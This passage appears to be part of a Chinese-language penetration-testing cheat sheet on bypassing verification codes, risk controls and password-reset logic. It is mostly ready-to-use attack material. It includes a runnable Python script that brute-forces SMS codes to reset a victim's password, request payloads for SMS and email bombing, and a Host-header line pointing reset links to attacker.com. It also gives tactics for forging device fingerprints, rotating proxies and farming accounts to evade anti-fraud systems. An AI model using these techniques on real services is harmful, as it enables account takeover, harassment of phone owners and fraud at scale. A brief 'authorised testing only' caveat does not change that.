## 六、验证码、认证逻辑与风控对抗

### 6.1 验证码绕过基础（保留经典手法并深化）

```
1. 删除/置空验证码参数：
   POST /login {"phone":"<PHONE-REDACTED>","code":"123456"} → 删除 code 字段
   POST /login {"phone":"<PHONE-REDACTED>","code":""}       → 空验证码
   POST /login {"phone":"<PHONE-REDACTED>"}                 → 不传验证码
   （后端可能仅"验证码字段存在时"才校验）

2. 验证码复用/不失效：
   一次验证码多次使用（登录/注册/重置/换绑全通用）
   验证码校验后不置失效 → 同一 code 可反复用
   验证码无过期时间 → 旧码可长期使用

3. 验证码泄露：
   GET /send-code?phone=xxx → 响应/Set-Cookie/调试字段中包含 code
   验证码在 URL 中 / JS 注释中 / 前端埋点中

4. 验证码可爆破：
   4 位纯数字 → 10000 次可爆（见下方脚本）
   6 位数字无频率限制 → 1000000 次可爆
   验证码=手机号后 4/6 位、=订单号、=时间戳可预测

5. 万能验证码：000000/888888/123456/666666 是否硬编码
6. 更换手机号不重发：给自己手机发码 → 提交时改 phone 为受害者号码 → 认证受害者
7. 验证码与请求体分离：验证码校验和业务操作在不同请求 → 单独绕过验证码校验请求
8. 类型混淆：code 传数组/对象/字符串转数字 → 校验逻辑分支差异
```

**验证码爆破脚本（Python，可直接运行）：**
```python
import requests

def brute_sms_code(phone, target_url):
    """4位验证码爆破示例——仅限授权测试"""
    s = requests.Session()
    for i in range(10000):
        code = f"{i:04d}"
        r = s.post(target_url, json={
            "phone": phone,
            "code": code,
            "new_password": "P@ssw0rd2026"
        }, timeout=10)
        # 根据业务响应特征调整判定条件
        if r.status_code == 200 and "成功" in r.text:
            print(f"[+] 命中验证码: {code}")
            return code
        if i % 500 == 0:
            print(f"[*] 已尝试 {i}/10000")
    print("[-] 未命中")

brute_sms_code("<PHONE-REDACTED>", "https://target.com/api/reset-password")
```

### 6.2 图形/滑块/行为验证码对抗

```
1. 图形验证码（4-6 位字母数字）：
   - 机器学习 OCR（CNN/CRNN 模型识别，开源 ddddocr 可直接用）
   - 验证码校验与业务解耦 → 直接跳过图形码校验请求
   - 图形码固定/可预测（种子固定、字典有限）→ 碰撞
2. 滑块验证码（拖动拼图）：
   - 轨迹伪造：模拟人类轨迹（加速-减速-抖动）而非匀速直线
   - 缺口位置预测：返回结果中可能带缺口坐标（前端计算后提交，可抓包直接提交缺口距离）
   - 行为接口重放：识别成功后的 token 复用
3. 行为验证码（无感/点选）：
   - 风险决策基于设备指纹+行为轨迹 → 伪造指纹+正常轨迹通过
   - 前端行为采集 JS 可被禁用/绕过（直接提交结果字段）
4. 通用思路：验证码只是"风控决策的一个因子"，找到业务接口的**独立入口**（APP 端/小程序端/老版本 API/内部 API）往往无验证码
```

### 6.3 设备指纹与行为风控绕过

```
1. 设备指纹（指纹 ID 由前端 JS 生成上报）：
   - 直接修改/伪造 device_id/fingerprint 参数 → 每次请求换指纹
   - 指纹为空/缺失 → 部分风控放行
   - 复用他人指纹 → 把风险分摊到他人设备
2. IP 维度风控：
   - XFF/X-Real-IP/Client-IP 头伪造（若后端信任头）
   - 代理池/动态住宅 IP
   - IPv6 前缀轮换（/64 地址池）
   - 移动基站出口 IP（运营商 NAT 池天然分散）
3. 账号维度风控：
   - 多账号轮换（配合手机号池/邮箱批量注册）
   - 账号养号（模拟真实行为一段时间再操作）
4. 行为风控（频率/节奏/操作序列）：
   - 模拟人类操作节奏（思考时间、点击轨迹、页面停留）
   - 拆分长链路为多步慢速执行
   - 时间错峰（业务低峰时段，风控阈值常更宽松）
5. 风控旁路：
   - APP 端 API（接口签名可逆向后，风控规则常比 Web 宽松）
   - 老版本 API（未接入新风控）
   - 内部/灰度 API（未上风控）
   - 第三方平台/开放平台 API（不同风控策略）
```

### 6.4 短信/邮件轰炸（保留深化）

```http
# 无频率限制
POST /send-sms {"phone":"<PHONE-REDACTED>"}  → 重放无限制 → 短信轰炸

# 绕过频率限制
# 1. 手机号格式变形（同一真实号码不同表示）
phone=<PHONE-REDACTED> → phone=+8613800138000 → phone=008613800138000 → phone=8613800138000
# 2. 不同接口轰炸同一手机号
/api/send-login-code / /api/send-register-code / /api/send-reset-code / /api/send-bind-code
# 3. 参数污染
phone=<PHONE-REDACTED>&phone=<PHONE-REDACTED> → 单手机号限制被绕过
# 4. 改 Cookie/IP（XFF 头）
X-Forwarded-For: 1.1.1.1 → 每次换 IP 绕过 IP 限流
# 5. 邮箱轰炸
同短信，注册/重置邮件到任意邮箱，无频率限制可批量垃圾邮件
# 6. 验证码回显型轰炸：部分接口响应/调试日志回显验证码
```

### 6.5 密码重置与账户接管逻辑

```
1. 重置 Token 泄露：
   - Token 在 URL（Referer/日志泄露）
   - Token 可预测（时间戳/用户ID/base64/固定前缀+自增）
   - Token 不过期 / 多用户共用同一格式
2. 修改请求中的用户/手机号：
   POST /reset-password {"phone":"自己","code":"自己收到的","new_password":"x"}
   → 改 phone 为受害者 → 用自己验证码重置受害者密码
3. 修改 Host 头：
   Host: attacker.com → 重置链接指向攻击者域名，用户点击后 token 外泄
4. 跳过验证码步骤（状态机跳步）：
   POST /reset-password/step1 发码 → POST /reset-password/step3 直接设置新密码（跳过 step2 校验）
5. Token 与用户未绑定：
   拿自己 token 替换 username/uid 为受害者 → 用自己 token 重置受害者
6. 响应侧信道：重置接口对"号码存在/不存在"返回差异 → 枚举 + 定向攻击
7. 并发重置：同一 token 并发提交重置 → 两次都成功（双重接管）
8. 登录态接管：重置成功后旧 token/session 未失效 → 双重会话
9. 绑定手机/邮箱逻辑：
   - 换绑验证码发给新手机 → 改新手机为受害者手机 → 验证码发到受害者 → 拦截
   - 换绑接口 IDOR：改 user_id 换绑他人账号
10. remember_me/自动登录：Cookie 中 user_id|hash，hash 可伪造/弱算法可爆破
```

### 6.6 注册/登录逻辑

```
1. 重复注册绕过唯一性（大小写/空格/Unicode）：
   admin / Admin / ADMIN / "admin " / "a\u200bdmin"（零宽字符）
2. 用户名枚举：注册返回"已存在"；登录返回"用户不存在/密码错误"差异
3. 登录爆破：无频率限制 + 多线程字典（注意风控，见 6.3）
4. OAuth/第三方登录：state 参数缺失/固定 → CSRF 登录；callback 参数可控 → token 泄露
5. 会话固定（Session Fixation）：登录前后 session id 不变
6. JWT 逻辑：alg=none、弱密钥爆破、过期校验缺失、role 字段客户端可改
```

